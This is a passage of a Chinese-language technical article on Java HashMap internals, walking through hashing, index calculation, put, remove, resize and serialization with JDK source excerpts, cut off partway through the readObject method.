        <content type="html"><![CDATA[<table><thead><tr><th>关注点</th><th>结论</th></tr></thead><tbody><tr><td>是否允许空</td><td>key和value都运行空</td></tr><tr><td>是否允许重复元素</td><td>key重复会覆盖，value允许重复</td></tr><tr><td>是否有序</td><td>无序</td></tr><tr><td>是否线程安全</td><td>非线程安全</td></tr></tbody></table><h2 id="hashmap的数据结构"><a class="markdownIt-Anchor" href="#hashmap的数据结构"></a> HashMap的数据结构</h2><p>在Java语言中，最基本的两种结构就是数组和模拟指针（引用），所有的数据结构都可以使用这两个基本结构来构造。HashMap实际就是一个&quot;链表散列&quot;的数据结构，即数组与链表的结合体。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-fda48f04c751b2e9.jpg" alt="" /></p><p>从上图可以看出，HashMap底层就是一个数组结构，数组中的每一项又是一个链表。当新建一个HashMap的时候，就会初始化一个数组。</p><p>首先看一下HashMap的一个存储单元Node：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">        Node(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.hash = hash;</span><br><span class="line">            <span class="keyword">this</span>.key = key;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> K <span class="title">getKey</span><span class="params">()</span>        </span>&#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">getValue</span><span class="params">()</span>      </span>&#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key + <span class="string">"="</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">setValue</span><span class="params">(V newValue)</span> </span>&#123;</span><br><span class="line">            V oldValue = value;</span><br><span class="line">            value = newValue;</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">                Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">                <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                    Objects.equals(value, e.getValue()))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有上面代码可以看出，Node就是数组中的元素，每个Map.Entry其实就是一个Key-value对，它持有一个指向下一个元素的引用，这就构成了链表。</p><h2 id="功能实现-方法"><a class="markdownIt-Anchor" href="#功能实现-方法"></a> 功能实现-方法</h2><h3 id="确定哈希桶数组索引位置"><a class="markdownIt-Anchor" href="#确定哈希桶数组索引位置"></a> 确定哈希桶数组索引位置</h3><p>不管增加、删除、查找键值对，定位到哈希桶数组的位置都是关键的一步，而定位数组索引的主要方法如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jdk1.8 &amp; jdk1.7</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">// 第一步：h = key.hashCode() 取hashCode值</span></span><br><span class="line">    <span class="comment">// 第二步：h ^ (h &gt;&gt;&gt; 16)     高位参与运算</span></span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jdk1.7的源码，jdk1.8没有这个方法，但是实现原理一样的</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">indexFor</span><span class="params">(<span class="keyword">int</span> h, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 第三步: 取模运算</span></span><br><span class="line">     <span class="keyword">return</span> h &amp; (length-<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里Hash算法本质上就是三步：取key的hashCode值、高位运算、取模运算</p><p>对于任意给定的对象，只要它的hashCode()值相同，那么调用hash()方法中所计算得到的hash码总是相同的。我们首先想到就是把hash值对数组长度求模，这样就保证了元素的分布相对比较均匀。但是，求模运算时间耗费较大，所以采用了indexFor()方法来计算该对象应该保存在table数组中的哪个索引处。</p><p>这个方法非常巧妙，它通过h &amp; (table.length - 1)来得到该对象的保存位，而HashMap底层数组的长度总是2的n次方，这是HashMap在速度上的优化。当length总是2的n次方时，h &amp; (length - 1)运算等价于对length取模，也就是h % length，但是&amp;比%具有更高的效率。</p><p>在JDK1.8的实现中，优化了高位运算的算法，通过hashCode()的高16位异或低16位实现的：(h = k.hashCode()) ^ (h &gt;&gt;&gt; 16)，主要是从速度、功效、质量来考虑的，这么做可以在数组table的length比较小的时候，也能保证考虑到高低Bit都参与到Hash的计算中，同时不会有太大的开销。</p><p>如下图，其中n为table的长度。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-24c0db720e2d499f.png" alt="" /></p><h3 id="添加与修改数据"><a class="markdownIt-Anchor" href="#添加与修改数据"></a> 添加与修改数据</h3><p>由于Java8对hashMap底层进行了优化，当链表长度大于8时，转换为红黑树进行处理，因此以下采用了美团点评技术团队的讲解。</p><p>HashMap的put方法执行过程可以通过下图来理解。</p><p>步骤一：判断键值对数组table[i]是否为空或为null，否则执行resize()进行扩容；</p><p>步骤二：根据键值key计算hash值得到插入的数组索引i，如果table[i]==null，直接新建节点添加，转向⑥，如果table[i]不为空，转向③；</p><p>步骤三：判断table[i]的首个元素是否和key一样，如果相同直接覆盖value，否则转向④，这里的相同指的是hashCode以及equals；</p><p>步骤四：判断table[i] 是否为treeNode，即table[i] 是否是红黑树，如果是红黑树，则直接在树中插入键值对，否则转向⑤；</p><p>步骤五：遍历table[i]，判断链表长度是否大于8，大于8的话把链表转换为红黑树，在红黑树中执行插入操作，否则进行链表的插入操作；遍历过程中若发现key已经存在直接覆盖value即可；</p><p>步骤六：插入成功后，判断实际存在的键值对数量size是否超多了最大容量threshold，如果超过，进行扩容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 对key的hashCode()做hash</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent, <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">// 步骤一：tab为空则创建</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// 步骤二: 计算index,并对null进行处理 </span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// 步骤三：节点key存在，直接覆盖value</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// 步骤四：判断该链为红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">// 步骤五：该链为链表</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">// 链表长度大于8转换为红黑树进行处理</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// key已经存在直接覆盖value</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// 步骤六：超过最大容量就扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除数据"><a class="markdownIt-Anchor" href="#删除数据"></a> 删除数据</h3><p>下面是Java8中删除数据源代码的分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = removeNode(hash(key), key, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">removeNode</span><span class="params">(<span class="keyword">int</span> hash, Object key, Object value, <span class="keyword">boolean</span> matchValue, <span class="keyword">boolean</span> movable)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, index;</span><br><span class="line">    <span class="comment">// 步骤一：找到要删除数组元素为p</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (p = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt; node = <span class="keyword">null</span>, e; K k; V v;</span><br><span class="line">        <span class="comment">// 步骤二：数组元素p存在，表示要删除的节点node赋为p</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            node = p;</span><br><span class="line">        <span class="comment">// 数组元素p是链表，则将链表的下一个节点赋给节点e</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((e = p.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 步骤三：如果p为红黑树，则调用方法找到要删除的节点赋给node</span></span><br><span class="line">            <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);</span><br><span class="line">            <span class="comment">// 步骤四：如果为链表，则找到对应要删除的节点赋给node</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key ||</span><br><span class="line">                            (key != <span class="keyword">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">                        node = e;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果找到要删除的节点node</span></span><br><span class="line">        <span class="keyword">if</span> (node != <span class="keyword">null</span> &amp;&amp; (!matchValue || (v = node.value) == value || (value != <span class="keyword">null</span> &amp;&amp; value.equals(v)))) &#123;</span><br><span class="line">            <span class="comment">// 步骤五：判断此时数组元素的类型，并删除对应的节点node</span></span><br><span class="line">            <span class="keyword">if</span> (node <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                ((TreeNode&lt;K,V&gt;)node).removeTreeNode(<span class="keyword">this</span>, tab, movable);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node == p)</span><br><span class="line">                tab[index] = node.next;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                p.next = node.next;</span><br><span class="line">            ++modCount;</span><br><span class="line">            --size;</span><br><span class="line">            afterNodeRemoval(node);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hashmap的其他相关讲解"><a class="markdownIt-Anchor" href="#hashmap的其他相关讲解"></a> HashMap的其他相关讲解</h2><h3 id="扩容机制"><a class="markdownIt-Anchor" href="#扩容机制"></a> 扩容机制</h3><p>扩容就是重新计算容量，当HashMap中无法容纳更多的元素时，就要扩大数组的长度，以便容纳更多的元素。由于Java中的数组是无法自动扩容的，所以要使用一个新的数组来代替已有的容量小的数组。</p><p>下面我们分析resize()方法的源码，由于Java8引入了红黑树，因此还采用Java7的源码进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传入新的容量</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 引用扩容前的Entry数组</span></span><br><span class="line">    Entry[] oldTable = table;</span><br><span class="line">    <span class="keyword">int</span> oldCapacity = oldTable.length;</span><br><span class="line">    <span class="comment">// 扩容前的数组大小如果已经达到最大(2^30)了     </span></span><br><span class="line">    <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">        <span class="comment">// 修改阈值为int的最大值(2^31-1)，这样以后就不会扩容了</span></span><br><span class="line">        threshold = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化一个新的Entry数组</span></span><br><span class="line">    Entry[] newTable = <span class="keyword">new</span> Entry[newCapacity];</span><br><span class="line">    <span class="comment">// 将数据转移到新的Entry数组里</span></span><br><span class="line">    transfer(newTable);</span><br><span class="line">    <span class="comment">// HashMap的table属性引用新的Entry数组</span></span><br><span class="line">    table = newTable;</span><br><span class="line">    <span class="comment">// 修改阈值</span></span><br><span class="line">    threshold = (<span class="keyword">int</span>)(newCapacity * loadFactor);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将原有Entry数组的元素拷贝到新的Entry数组里</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transfer</span><span class="params">(Entry[] newTable)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// src引用了旧的Entry数组</span></span><br><span class="line">    Entry[] src = table;                </span><br><span class="line">    <span class="keyword">int</span> newCapacity = newTable.length;</span><br><span class="line">    <span class="comment">// 遍历旧的Entry数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; src.length; j++) &#123;</span><br><span class="line">        <span class="comment">// 取得旧Entry数组的每个元素</span></span><br><span class="line">        Entry&lt;K,V&gt; e = src[j];           </span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 释放旧Entry数组的对象引用（for循环后，旧的Entry数组不再引用任何对象）</span></span><br><span class="line">            src[j] = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                Entry&lt;K,V&gt; next = e.next;</span><br><span class="line">                <span class="comment">// 重新计算每个元素在数组中的位置</span></span><br><span class="line">                <span class="keyword">int</span> i = indexFor(e.hash, newCapacity); </span><br><span class="line">                e.next = newTable[i]; <span class="comment">// 标记[1]</span></span><br><span class="line">                newTable[i] = e;      <span class="comment">// 将元素放在数组上</span></span><br><span class="line">                e = next;             <span class="comment">// 访问下一个Entry链上的元素</span></span><br><span class="line">            &#125; <span class="keyword">while</span> (e != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newTable[i]的引用赋给了e.next，也就是使用了单链表的头插入方式，同一个位置上新元素总会被放在链表的头部位置；这样先放在一个索引的元素最终会放在Entry链的尾部（如果发生了hash冲突），这一点Java8与其不同。由于重新计算了hash值，所以最终可能放在新数组的不同位置。</p><p>下面举个例子简单说明一下扩容的原理。我们采用的hash算法就是key对数组的长度取模。其中哈希桶数组table数组的长度size=2，put的顺序是3、7、5。在mod 2后都在table[1]发生了冲突。这里假设负载因子loadFactor=1，即当键值对实际大小size大于table的实际大小时进行扩容。下面是resize的过程示意图。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-6988e87b562077bb.png" alt="" /></p><p>Java8中对新数组的索引计算采用了更加简洁的算法，不需要每次去计算hash值；而且在旧链表迁移到新链表的时候，如果新表的数组索引位置相同，则链表元素会倒置，而Java8则不会，详细解析可以见<a href="https://tech.meituan.com/java-hashmap.html" target="_blank" rel="noopener">tech.meituan.com/java-hashmap.html</a></p><h3 id="hashmap的table是transient的"><a class="markdownIt-Anchor" href="#hashmap的table是transient的"></a> HashMap的table是transient的</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br></pre></td></tr></table></figure><p>由于table采用了transient修饰，也就是表示其不可以被序列化，它的原因如下：</p><ul><li>HashMap是基于hashCode的，hashcode作为Object的方法，是native修饰的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>这意味着hashCode与底层相关，对于不同平台的虚拟机，会有不用的hashCode实现方式，也就是同一个对象在不同的平台下会有不同的hashcode值。</p><p>由于Java的跨平台特性，如果table不用transient修饰，在虚拟机A下的程序在虚拟机B下就会造成无法正常运行，这样就失去了其跨平台的意义，所以为了避免这样的情况，Java自己重写了其序列化table的方法，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buckets = capacity();</span><br><span class="line">    <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    s.writeInt(buckets);</span><br><span class="line">    s.writeInt(size);</span><br><span class="line">    internalWriteEntries(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                            loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                            mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; 